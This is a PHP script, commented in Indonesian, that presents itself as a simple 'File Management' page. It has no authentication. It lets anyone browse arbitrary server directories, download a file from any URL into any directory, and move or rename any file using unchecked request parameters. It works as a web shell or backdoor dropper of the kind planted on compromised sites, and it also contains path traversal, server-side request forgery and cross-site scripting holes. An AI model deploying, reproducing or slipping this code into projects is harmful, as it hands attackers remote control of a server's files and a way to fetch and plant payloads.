<?php
// Fungsi untuk mengunduh file dari URL dan menyimpannya ke direktori yang dipilih
function uploadFromUrl($url, $saveTo) {
    $fileContent = file_get_contents($url);
    if ($fileContent === FALSE) {
        die('Failed to download file from URL');
    }
    file_put_contents($saveTo, $fileContent);
    echo "<div class='alert alert-success'>File uploaded successfully: $saveTo</div>";
}

// Fungsi untuk menampilkan link ke folder dan file dalam direktori
function display_path_links($dir) {
    if (is_dir($dir)) {
        $folders = [];
        $files = [];

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            if (is_dir($dir . '/' . $item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        // Menampilkan folder
        foreach ($folders as $folder) {
            $folderPath = htmlspecialchars($dir . '/' . $folder);
            echo "<a href='?dir=" . urlencode($folderPath) . "' class='list-group-item list-group-item-action'>$folder/</a>";
        }

        // Menampilkan file
        foreach ($files as $file) {
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            echo "<span>$file</span>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='source' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<input type='text' name='destination' class='form-control-sm' placeholder='New path'>";
            echo "<button type='submit' class='btn btn-warning btn-sm ml-2'>Move</button>";
            echo "</form>";
            echo "</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Directory not found.</div>";
    }
}

// Fungsi untuk memindahkan file
function moveFile($source, $destination) {
    if (rename($source, $destination)) {
        echo "<div class='alert alert-success'>File moved successfully.</div>";
    } else {
        echo "<div class='alert alert-danger'>Failed to move file.</div>";
    }
}

// Menangani upload file dari URL
if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = $_POST['dir'];
    $filename = basename($url); // Ambil nama file dari URL
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

// Menangani pemindahan file
if (isset($_POST['source']) && isset($_POST['destination'])) {
    $source = $_POST['source'];
    $destination = $_POST['destination'];
    moveFile($source, $destination);
}

// Menentukan direktori saat ini atau yang dipilih
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$displayDir = realpath($dir); // Mendapatkan path direktori yang absolut

// Membuat path direktori sebagai array
$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Management</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1 class="mb-4">File Management</h1>

        <h2>Upload File to Current Directory</h2>
        <form method="post">
            <div class="form-group">
                <label for="url">File URL</label>
                <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
            <button type="submit" class="btn btn-primary">Upload from URL</button>
        </form>

        <h2 class="mt-4">Directory Listing</h2>
        <div class="alert alert-info">
            <strong>Current Directory:</strong> 
            <?php
            // Menampilkan path direktori sebagai link
            $currentPath = '/'; // Mulai dengan root
            echo "<a href='?dir=' class='btn btn-link'>/</a> ";
            foreach ($dirArray as $index => $folder) {
                $currentPath .= htmlspecialchars($folder) . '/';
                $encodedPath = urlencode($currentPath);
                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
                if ($index < count($dirArray) - 1) {
                    echo " / ";
                }
            }
            ?>
        </div>
        <div class="list-group">
            <?php
            display_path_links($dir);
            ?>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
